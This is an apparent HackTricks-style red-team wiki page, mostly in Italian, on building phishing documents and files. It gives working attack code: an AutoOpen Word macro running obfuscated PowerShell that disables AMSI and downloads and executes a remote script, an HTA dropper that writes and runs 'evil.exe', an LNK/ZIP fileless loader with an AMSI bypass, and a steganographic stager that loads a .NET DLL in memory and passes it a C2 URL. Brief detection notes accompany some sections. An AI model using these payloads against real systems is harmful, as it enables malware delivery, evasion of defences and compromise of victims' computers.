# File e Documenti di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue una validazione dei dati del file prima di aprirlo. La validazione dei dati avviene sotto forma di identificazione della struttura dei dati, secondo lo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file in analisi non verrà aperto.

Di solito, i file Word contenenti macro usano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiando l'estensione e mantenere comunque la capacità di eseguire le macro.\
Ad esempio, un file RTF non supporta le macro, per progettazione, ma un file DOCM rinominato in RTF sarà gestito da Microsoft Word e sarà in grado di eseguire le macro.\
Gli stessi aspetti interni e meccanismi si applicano a tutto il software della Microsoft Office Suite (Excel, PowerPoint ecc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:
```bash
assoc | findstr /i "word excel powerp"
```
I file DOCX che fanno riferimento a un modello remoto (File – Opzioni – Componenti aggiuntivi – Gestisci: Modelli – Vai) che include macro possono “eseguire” macro allo stesso modo.

### Caricamento immagine esterna

Vai a: _Inserisci --> Elementi rapidi --> Campo_\
_**Categorie**: Collegamenti e riferimenti, **Nomi dei campi**: includePicture, e **Nome file o URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor tramite macro

È possibile usare macro per eseguire codice arbitrario dal documento.

#### Funzioni di autocaricamento

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice delle macro
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Rimuovi manualmente i metadati

Vai su **File > Info > Ispeziona documento > Ispeziona documento**, che aprirà il Document Inspector. Fai clic su **Ispeziona** e poi su **Rimuovi tutto** accanto a **Proprietà del documento e informazioni personali**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Fallo perché non puoi salvare le macro dentro un `.docx` e c'è uno stigma intorno all'estensione macro-enabled **`.docm`** (es. l'icona in miniatura ha un grande `!` e alcuni gateway web/email le bloccano completamente). Pertanto, questa estensione legacy **`.doc`** è il miglior compromesso.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzare l'autenticazione NTLM

Ci sono diversi modi per **forzare l'autenticazione NTLM "da remoto"**, per esempio, puoi aggiungere **immagini invisibili** alle email o all'HTML che l'utente aprirà (anche HTTP MitM?). Oppure inviare alla vittima **l'indirizzo di file** che **attiveranno** un'**autenticazione** solo aprendo la cartella.

**Consulta queste idee e altre nelle seguenti pagine:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi soltanto rubare l'hash o l'autenticazione, ma anche effettuare NTLM relay attacks:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campagne altamente efficaci consegnano uno ZIP che contiene due documenti decoy legittimi (PDF/DOCX) e un .lnk maligno. Il trucco è che il vero PowerShell loader è memorizzato all'interno dei byte grezzi dello ZIP dopo un marker univoco, e il .lnk lo estrae ed esegue completamente in memoria.

Flusso tipico implementato dal one-liner PowerShell del .lnk:

1) Individua lo ZIP originale in percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e nella cartella padre della directory di lavoro corrente.  
2) Legge i byte dello ZIP e trova un marker hardcoded (es., xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.  
3) Copia lo ZIP in %ProgramData%, lo estrae lì, e apre il .docx esca per apparire legittimo.  
4) Bypassare AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deoffuscare la fase successiva (es., rimuovere tutti i caratteri '#') ed eseguirla in memoria.

Esempio di scheletro PowerShell per estrarre ed eseguire la fase incorporata:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Note
- La delivery spesso abusa di sottodomini PaaS reputati (es., *.herokuapp.com) e può limitare l'accesso ai payload (servire ZIP benigni in base a IP/UA).
- La fase successiva frequentemente decripta shellcode codificato in base64/XOR e lo esegue tramite Reflection.Emit + VirtualAlloc per minimizzare gli artefatti su disco.

Persistenza usata nella stessa catena
- COM TypeLib hijacking del Microsoft Web Browser control in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload. Vedi dettagli e comandi pronti all'uso qui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- File ZIP contenenti la stringa marker ASCII (es., xFIQCV) aggiunta ai dati dell'archivio.
- .lnk che enumera cartelle parent/user per localizzare lo ZIP e apre un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di business a lunga durata che terminano con link ospitati su domini PaaS di fiducia.

## Payload delimitati tramite steganografia in immagini (PowerShell stager)

Catene di loader recenti consegnano un JavaScript/VBS offuscato che decodifica ed esegue un PowerShell stager codificato in Base64. Questo stager scarica un'immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 nascosta come testo tra marcatori unici di inizio/fine. Lo script cerca questi delimitatori (esempi visti in the wild: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo intermedio, lo decodifica da Base64 in byte, carica l'assembly in memoria e invoca un metodo di entry noto passando l'URL di C2.

Flusso di lavoro
- Fase 1: Dropper JS/VBS archiviato → decodifica Base64 incorporato → avvia il PowerShell stager con -nop -w hidden -ep bypass.
- Fase 2: PowerShell stager → scarica l'immagine, estrae il Base64 delimitato da marker, carica la DLL .NET in memoria e chiama il suo metodo (es., VAI) passando l'URL di C2 e le opzioni.
- Fase 3: Il loader recupera il payload finale e tipicamente lo inietta tramite process hollowing in un binario trusted (comunemente MSBuild.exe). Vedi di più su process hollowing e trusted utility proxy execution qui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare un metodo .NET in memoria:

<details>
<summary>Estrattore e loader di payload steganografici in PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Note
- This is ATT&CK T1027.003 (steganography/marker-hiding). I marker variano tra le campagne.
- AMSI/ETW bypass e string deobfuscation vengono comunemente applicati prima del caricamento dell'assembly.
- Ricerca: scansionare le immagini scaricate per delimitatori noti; identificare PowerShell che accede alle immagini e decodifica immediatamente i blob Base64.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Logica scheletrica (astratta):
- Leggere il contenuto del proprio file
- Individuare un blob Base64 tra stringhe inutili
- Decodificare in ASCII PowerShell
- Eseguire con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicatori di rilevamento
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei utente.

## Windows files to steal NTLM hashes

Consulta la pagina su **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
